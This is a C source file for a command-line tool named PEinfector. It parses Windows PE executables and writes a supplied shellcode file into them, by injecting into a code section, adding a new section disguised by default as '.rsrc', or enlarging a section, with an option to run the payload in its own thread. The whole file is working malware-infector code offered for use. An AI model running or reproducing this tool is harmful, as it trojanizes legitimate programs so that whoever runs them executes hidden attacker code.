#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

#include "PEinfector.h"




#define MAX_FILE_PATH 512
#define MAX_STRING    256


static char file_path[MAX_FILE_PATH] = "";
static char shellcode_file_path[MAX_FILE_PATH] = "";
static char output_file_path[MAX_FILE_PATH] = "";
static int show_sections_flag = 0;
static int thread_flag = 0;

static void ParseOptions(int argc, char** argv);
static void PrintHelp(char* prog_name);

static inf_method method = METHOD_CODE_INJECT;
static char section_name[SECTION_SHORT_NAME_LENGTH] = "";


int main(int argc, char** argv) {
	pe_dos_header dosHeader;
	pe_nt_header ntHeader;
	pe64_nt_header ntHeader64;
	
	FILE* f = NULL;
	ach_mode mode = MODE_32BIT;
	
	ParseOptions(argc, argv);
	
	if (!strlen(file_path) || 
		!strlen(shellcode_file_path) || 
		!strlen(output_file_path)) {
		fprintf(stderr, "Missing required options!\n");
		PrintHelp(argv[0]);
	}
	
	f = fopen(file_path, "rb");
	
	if (!f) {
		fprintf(stderr, "Can't open file %s\n", file_path);
		return -1;
	}
	
	memset(&dosHeader, 0, sizeof(pe_dos_header));
	memset(&ntHeader, 0, sizeof(pe_nt_header));
	memset(&ntHeader64, 0, sizeof(pe64_nt_header));
	
	int err_parse = pe_parse(f, &dosHeader, &ntHeader, &ntHeader64);
	//if (pe_parse(f, &dosHeader, &ntHeader, &ntHeader64)) {
	if (err_parse) {
		fprintf(stderr, "Bad PE file: %s err: %d\n", file_path, err_parse);
		return -2;
	}
	
	if (ntHeader64.nt_magic) { //if ntHeader64 filled
		mode = MODE_64BIT;
	}
	
	list_pe_section_t sections = NULL;
	char* dosOriginalGap = NULL; //bytes between end of dos header and PE signature
	char* sectOriginalGap = NULL; //bytes between end of sections header and begin of first section
	uint16_t dosOriginalGapSize = dosHeader.e_lfanew - sizeof(pe_dos_header);
	uint16_t sectOriginalGapSize = 0;
	uint16_t sectEndOffset = 0;
	
	if (dosOriginalGapSize) {
		dosOriginalGap = (char*)malloc(dosOriginalGapSize);
		
		if (!dosOriginalGap) {
			fprintf(stderr, "Internal error: can't allocate memory for DOS gap\n");
			fclose(f);
			return -3;
		}
		
		fseek(f, sizeof(pe_dos_header), SEEK_SET);
		fread(dosOriginalGap, dosOriginalGapSize, 1, f);
	}
	
	switch (mode) {
		case MODE_32BIT:
			fprintf(stdout, "That binary has 32bit arch\n");
			fprintf(stdout, "EntryPoint: 0x%08X\n", ntHeader.nt_optional_header.address_of_entry_point);
			fprintf(stdout, "ImageBase: 0x%08X\n", ntHeader.nt_optional_header.image_base);
			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader.nt_optional_header.file_alignment);
			
			sections = pe_parse_sections(f, &dosHeader, &ntHeader);
			sectEndOffset = dosHeader.e_lfanew + ntHeader.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
																		ntHeader.nt_file_header.number_of_sections * sizeof(pe_section_header);
			break;
		case MODE_64BIT:
			fprintf(stdout, "That binary has 64bit arch\n");
			fprintf(stdout, "EntryPoint: 0x%08X\n", ntHeader64.nt_optional_header.address_of_entry_point);
			fprintf(stdout, "ImageBase: 0x%016lX\n", ntHeader64.nt_optional_header.image_base);
			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader64.nt_optional_header.file_alignment);
			
			sections = pe64_parse_sections(f, &dosHeader, &ntHeader64);
			sectEndOffset = dosHeader.e_lfanew + ntHeader64.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
																		ntHeader64.nt_file_header.number_of_sections * sizeof(pe_section_header);
			break;
	}
	
	sectOriginalGapSize = sections->header.PointerToRawData - sectEndOffset;
	
	if (sectOriginalGapSize) {
		sectOriginalGap = (char*)malloc(sectOriginalGapSize);
		
		if (!sectOriginalGap) {
			fprintf(stderr, "Internal error: can't allocate memory for section gap\n");
			fclose(f);
			return -4;
		}
		
		fseek(f, sectEndOffset, SEEK_SET);
		fread(sectOriginalGap, sectOriginalGapSize, 1, f);
	}
	
	if (show_sections_flag) {
		list_pe_section_t curSect = sections;
		
		while (curSect) {
			pe_print_section_header(&curSect->header);
			fprintf(stdout, "\n");
			curSect = curSect->next;
		}
		
		fprintf(stdout, "\n");
	}
	
	//write
	FILE* out_f = fopen(output_file_path, "wb");
	
	if (!out_f) {
		fprintf(stderr, "Can't open file for output: %s\n", output_file_path);
		fclose(f);
		return -5;
	}
	
	FILE* sf = fopen(shellcode_file_path, "rb");
	
	if (!sf) {
		fprintf(stderr, "Can't open shellcode file: %s\n", shellcode_file_path);
		fclose(f);
		return -6;
	}
	
	//obtain shellcode file size
	fseek(sf, 0, SEEK_END);
	uint32_t xcode_size = ftell(sf);
	rewind(sf);
	
	fprintf(stdout, "size of shellcode: %u\n", xcode_size);
	
	unsigned char* xcode = (unsigned char*)malloc(xcode_size);
	
	if (!xcode) {
		fprintf(stderr, "Can't allocate memory for shellcode\n");
		fclose(f);
		fclose(out_f);
		fclose(sf);
		return -7;
	}
	
	fread(xcode, xcode_size, 1, sf);
	fclose(sf);
	
	int err = 0;
	switch (mode) {
		case MODE_32BIT:
			switch (method) {
				case METHOD_CODE_INJECT:
					err = pe_infect_section(&ntHeader, sections, xcode, xcode_size, thread_flag);
					break;
				case METHOD_CODE_NEWSECT:
					if (sectOriginalGapSize <= sizeof(pe_section_header)) {
						fprintf(stderr, "Not enough space in section header for new section record\n");
						err = -10;
					} else {
						err = pe_infect_new_section(&ntHeader, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".rsrc", thread_flag);
						if (!err) {
							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
						}
					}
					break;
				case METHOD_CODE_RESIZE:
					err = pe_infect_resize_section(&ntHeader, sections, xcode, xcode_size, thread_flag);
					break;
			}
			
			if (!err) {
				err = pe_write(out_f, &dosHeader, &ntHeader, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
			}
			break;
		case MODE_64BIT:
			if (thread_flag) {
				fprintf(stderr, "Thread flag can apply for 32bit binaries only\n");
				err = -11;
				break;
			}
			switch (method) {
				case METHOD_CODE_INJECT:
					err = pe64_infect_section(&ntHeader64, sections, xcode, xcode_size);
					break;
				case METHOD_CODE_NEWSECT:
					if (sectOriginalGapSize <= sizeof(pe_section_header)) {
						fprintf(stderr, "Not enough space in section header for new section record\n");
						err = -10;
					} else {
						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".rsrc");
						if (!err) {
							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
						}
					}
					break;
				case METHOD_CODE_RESIZE:
					err = pe64_infect_resize_section(&ntHeader64, sections, xcode, xcode_size);
					break;
			}
			
			if (!err) {
				err = pe64_write(out_f, &dosHeader, &ntHeader64, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
			}
			break;
	}
	
	if (!err) {
		fprintf(stdout, "Infection success!\n");
	} else {
		fprintf(stderr, "Infection error %d\n", err);
		fclose(f);
		fclose(out_f);
		
		return -8;
	}	
	
	fclose(f);
	fclose(out_f);
	return 0;
}

static void ParseOptions(int argc, char** argv) {
	const char* short_options = "hi:o:s:dm:n:t";
	
	const struct option long_options[] = {
		{ "help", no_argument, NULL, 'h' },
		{ "input", required_argument, NULL, 'i' },
		{ "output", required_argument, NULL, 'o' },
		{ "shellcode", required_argument, NULL, 's' },
		{ "info", no_argument, NULL, 'd' },
		{ "method",  required_argument, NULL, 'm' },
		{ "name", required_argument, NULL, 'n' },
		{ "thread", no_argument, NULL, 't' },
		{ NULL, 0, NULL, 0 }
	};
	
	int res;
	int option_index;
	
	while (( res = getopt_long(argc, argv, short_options, 
		long_options, &option_index)) != -1) {
		switch (res) {
			case 'h':
				//print help
				PrintHelp(argv[0]);
				break;
			case 'i':
				strncpy(file_path, optarg, MAX_FILE_PATH);
				break;
			case 'o':
				strncpy(output_file_path, optarg, MAX_FILE_PATH);
				break;
			case 's':
				strncpy(shellcode_file_path, optarg, MAX_FILE_PATH);
				break;
			case 'd':
				show_sections_flag = 1;
				break;
			case 'm':
				if (!strncmp(optarg, "code", MAX_STRING)) {
					method = METHOD_CODE_INJECT;
				} else if (!strncmp(optarg, "sect", MAX_STRING)) {
					method = METHOD_CODE_NEWSECT;
				} else if (!strncmp(optarg, "resz", MAX_STRING)) {
					method = METHOD_CODE_RESIZE;
				} else {
					fprintf(stdout, "Unknown method \"%s\". Using default method (code)\n", optarg);
				}
				break;
			case 'n':
				strncpy(section_name, optarg, SECTION_SHORT_NAME_LENGTH);
				break;
			case 't':
				thread_flag = 1;
				break;
			default:
				PrintHelp(argv[0]);
				break;
		};
	};
}

static void PrintHelp(char* prog_name) {
	fprintf(stdout, "Usage: %s -i <input_file> -o <output_file> -s <raw_shellcode_file>\n", prog_name);
	fprintf(stdout, "\t -d - show section info\n");
	fprintf(stdout, "\t -m - set infection method (available values: code, sect, resz)\n");
	fprintf(stdout, "\t -n - set new section name (for selected method: sect)\n");
	fprintf(stdout, "\t -t - execute shellcode into another thread (for 32bit and resize or new section methods only)\n");
	fprintf(stdout, "Long options usage: %s --input <input_file> --output <output_file> --shellcode <raw_shellcode_file>\n", prog_name);
	fprintf(stdout, "\t --info - show section info\n");
	fprintf(stdout, "\t --method - set infection method (available values: code, sect)\n");
	fprintf(stdout, "\t --name - set new section name (for selected method: sect)\n");
	fprintf(stdout, "\t --thread - execute shellcode into another thread (for 32bit only)\n");
	exit(-99);
}
